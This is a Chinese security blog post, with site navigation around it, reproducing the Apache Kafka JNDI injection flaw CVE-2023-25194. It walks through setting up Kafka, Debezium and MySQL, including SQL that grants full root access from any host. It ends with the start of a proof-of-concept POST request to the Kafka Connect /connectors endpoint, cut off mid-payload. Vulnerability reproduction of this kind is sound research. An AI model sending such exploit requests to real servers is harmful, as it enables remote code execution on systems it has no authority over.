---
title: Apache Kafka  JNDI注入(CVE-2023-25194)漏洞复现浅析
url: https://www.secpulse.com/archives/198199.html
source: 安全脉搏
date: 2023-03-28
fetch_date: 2025-10-04T10:49:52.447877
---

# Apache Kafka  JNDI注入(CVE-2023-25194)漏洞复现浅析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Apache Kafka JNDI注入(CVE-2023-25194)漏洞复现浅析

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-03-27

10,683

#### 关于

Apache Kafka是一个开源的分布式事件流平台，被数千家公司用于高性能数据管道、流分析、数据集成和任务关键型应用程序。

#### 影响版本

> 2.4.0<=Apache kafka<=3.2.2

#### 环境搭建

满足影响版本的应该都可以，这里我是使用的版本为`2.5.0`

> wget https://archive.apache.org/dist/kafka/2.5.0/kafka\_2.13-2.5.0.tgz

直接解压

这里可以使用命令直接起起来，最新版的kafka是集成`Zookeeper`

> .binwindowszookeeper-server-start.bat .configzookeeper.properties

但是报错了，可以自己安装zookeeper

下载地址

> http://zookeeper.apache.org/releases.html

这里配置文件其实可以补钙，实际上日志记录功能可选择不要，直接启动

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886798.png "null")

服务端正常启动。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886799.png "null")

只要不报错即为正常启动

继续修改kafka配置文件`server.properties`文件，修改日志存放路径

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886800.png "null")

命令启动

```
.binwindowskafka-server-start.bat .configserver.properties
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886801.png "null")

测试kafa搭建是否存在问题

* • 创建主题

> .binwindowskafka-topics.bat --create --bootstrap-server localhost:9092 --replication-factor 1 --partitions 1 --topic test111

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886803.png "null")

* • 查询主题

> .binwindowskafka-topics.bat --list --bootstrap-server localhost:9092

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-16798868031.png "null")

* • 创建生产者

> .binwindowskafka-console-producer.bat --broker-list localhost:9092 --topic test111

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-16798868032.png "null")

* • 创建消费者

> .binwindowskafka-console-consumer.bat --bootstrap-server localhost:9092 --topic test111 --from-beginning

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886804.png "null")

消息收发没有问题，生产者输入信息之后消费者会自动消费。

启动connect

> .binwindowsconnect-standalone.bat .configconnect-standalone.properties .configconnect-file-source.properties .configconnect-file-sink.properties

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-16798868041.png "null")

因为牵涉到**补图片**，图片内的时间顺序可能不对，请忽略

访问

> http://192.168.2.135:8083/connector-plugins

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886805.png "null")

这里是没有插件的，所以需要安装插件。这里要复现CVE-2023-25194，需要使用**io.debezium.connector.mysql.MySqlConnector**类，所以需要配置Debezium MySQL 连接器配置属性

安装Debezium

> https://debezium.io/releases/2.1/

这里根据自己环境安装，比较友好的时不同的版本有介绍需要的java版本，因为我的java环境为1.8+的，所以这里我选择的版本比较老

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886806.png "null")

在kafka的安装目录创建一个文件夹

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886808.png "null")

存放debezium，修改kafka的配置文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-16798868081.png "null")

插件注意指向debezium的存放路径,重新启动，获取到插件，这里需要必坑的位置

1.java版本需要匹配kafka版本以及其他组件版本

2.配置文件需要修改,否则会报错。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886809.png "null")

kafka在连接Mysql时 数据需要同步到 Elasticsearch

具体的文章可以参考

> https://my.oschina.net/u/4923278/blog/5007756

安装mysql

> MySQL :: Download MySQL Installer

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-16798868091.png "null")

需要避坑的位置

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886811.png "null")

结束

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886812.png "null")

登录mysql数据库，设置允许外部连接

```
GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
GRANT ALL ON *.* TO ''@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886814.png "null")

* • set time\_zone='+8:00';
* • show variables like '%time\_zone%';

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886815.png "null")

mysql需要开启配置

```
log_bin           = mysql-bin
binlog_format     = ROW
binlog_row_image  = FULL
expire_logs_days  = 10
```

可参考

> https://blog.csdn.net/wang972779876/article/details/120002546

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886817.png "null")

访问路径

http://192.168.2.135:8083/connector-plugins

发现插件正常启动，参考的有复现的文章，说的时需要做时钟同步，但是在测试的时候发现其实时钟未做设置的时候也没有问题。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198199-1679886820.png "null")

#### 漏洞利用

ＰＯＣ如下：

```
POST /connectors HTTP/1.1
Host: 192.168.2.135:8083
Content-Type: application/json
Content-Length: 809

{
    "name": "mysql-connect",
    "config": {
        "connector.class": "io.debezium.connector.mysql.MySqlConnector",
        "database.hostname": "192.168.2.135",
        "database.port": "3306",
        "database.user": "root",
        "database.password": "root",
        "database.server.id": "316545017",
        "database.server.name": "test1",
        "database.history.kafka.boo...